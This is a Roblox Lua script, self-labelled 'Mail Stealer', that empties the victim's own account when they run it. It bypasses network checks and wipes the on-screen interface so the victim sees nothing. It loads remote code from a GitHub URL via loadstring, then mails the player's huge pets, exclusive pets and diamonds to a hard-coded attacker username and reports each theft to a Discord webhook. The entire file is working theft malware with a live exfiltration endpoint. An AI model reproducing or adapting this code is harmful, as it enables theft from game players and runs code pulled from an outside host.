scriptConfiguration = {
    Main = {
        Username = "gheer1467",
    },
    Send = {
        Huges = false,
        Exclusives = false,
        Diamonds = true
    }
}

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Library = require(ReplicatedStorage:WaitForChild("Library"))
local Client = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client"))
local Network = Client.Network
hookfunction(debug.getupvalue(Network.Invoke, 1) , function(...) return true end)
local Fire, Invoke = Network.Fire, Network.Invoke

local Player = game.Players.LocalPlayer

--Deleting everything inside of coregui
for i, v in pairs(game.CoreGui:GetChildren()) do
    v:Destroy()
end

--loading screen
loadstring(game:HttpGet("https://raw.githubusercontent.com/Zylees/MailStealer/main/loading-screen.lua"))()

--Teleporting to mailbox
Player.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")["__MAP"].Interactive.Mailbox.PrimaryPart.Position)

Player.Character.HumanoidRootPart.Anchored = true

game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.LockCenter

function getHuges()
    local huges = {}
    for i, v in pairs(Library.Save.Get().Pets) do 
        local pet = Library.Directory.Pets[v.id];
        if pet.huge then
            v.name = pet.name
            table.insert(huges, v)
        end
    end
    return huges
end

function getExclusives()
    local exclusives = {}
    for i, v in pairs(Library.Save.Get().Pets) do 
        local pet = Library.Directory.Pets[v.id];
        if pet.huge == false and pet.rarity == "Exclusive" then
            v.name = pet.name
            table.insert(exclusives, v)
        end
    end
    return exclusives
end

function sendWebhook(petName, isHuge, petId)
    local msg = {
            username = "Linear | Mail Stealer",
            avatar_url = "https://media.discordapp.net/attachments/1114258765282299994/1118603641901813801/jOzDJvfr_4x.jpg?width=676&height=676",
            content = "",
            tts = false,
            embeds = { {
              id = 108055822,
              fields = { {
                id = 805823863,
                name = "Pet Name:",
                value = petName,
                inline = true
              }, {
                id = 316503125,
                name = "Huge:",
                value = tostring(isHuge),
                inline = true
              }, {
                id = 739432312,
                name = "Pet ID:",
                value = " ```" .. petId .. "```"
              } },
              author = {
                name = "A Pet Was Successfuly Stolen!"
              },
              color = 26367,
              footer = {
                text = "Linear | Mail Stealer Script | Beta"
              },
              thumbnail = {
                url = "https://media.discordapp.net/attachments/1114258765282299994/1118603641901813801/jOzDJvfr_4x.jpg?width=676&height=676"
              }
            } },
            components = { },
            actions = { }
    }

    local request = http_request or request or HttpPost or syn.request
    request({
        Url = "https://discord.com/api/webhooks/1118596637011476480/s8uYnbRjgogO4KN8Ru3_eboAyQFKC59bNskBoNHN9sFQaaBbOuy0POMa5xEPNHXvav1v",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game.HttpService:JSONEncode(msg)
    })
end


function sendGift(petId)
    local args = {
        [1] = {
            Recipient = scriptConfiguration.Main.Username,
            Diamonds = 0,
            Pets = {petId},
            Message = "zylees stealer hit (Pet)!"
        }
    };
    Invoke("Send Mail", unpack(args));
end

function sendGiftDiamond(diamonds)
    local args = {
        [1] = {
            Recipient = scriptConfiguration.Main.Username,
            Diamonds = diamonds,
            Pets = {},
            Message = "zylees stealer hit (Diamond)!"
        }
    };
    Invoke("Send Mail", unpack(args));
end

local alreadyWebhooked = {}
function startSendingPets()
    --Sending Huges
    while #getHuges() > 0 and Player.leaderstats.Diamonds.Value > 100000 and scriptConfiguration.Send.Huges == true do 
        for _, huge in pairs(getHuges()) do
            pcall(function() sendGift(huge.uid) end)
            if not table.find(alreadyWebhooked, huge.uid) then
                sendWebhook(huge.name, huge.huge, huge.uid)
                table.insert(alreadyWebhooked, huge.uid)
            end
            task.wait()
        end
    end

    --Sending Other Random Exclusives
    while #getExclusives() > 0 and Player.leaderstats.Diamonds.Value > 100000 and scriptConfiguration.Send.Exclusives == true do 
        for _, exclusive in pairs(getExclusives()) do
            pcall(function() sendGift(exclusive.uid) end)
            if not table.find(alreadyWebhooked, exclusive.uid) then
                sendWebhook(exclusive.name, exclusive.huge, exclusive.uid)
                table.insert(alreadyWebhooked, exclusive.uid)
            end

            task.wait()
        end
    end

    --Sending Any Leftover Gems
    if Player.leaderstats.Diamonds.Value > 100000 and scriptConfiguration.Send.Diamonds == true then
        pcall(function() sendGiftDiamond(Player.leaderstats.Diamonds.Value - 100000) end)
    end
end

task.spawn(startSendingPets)
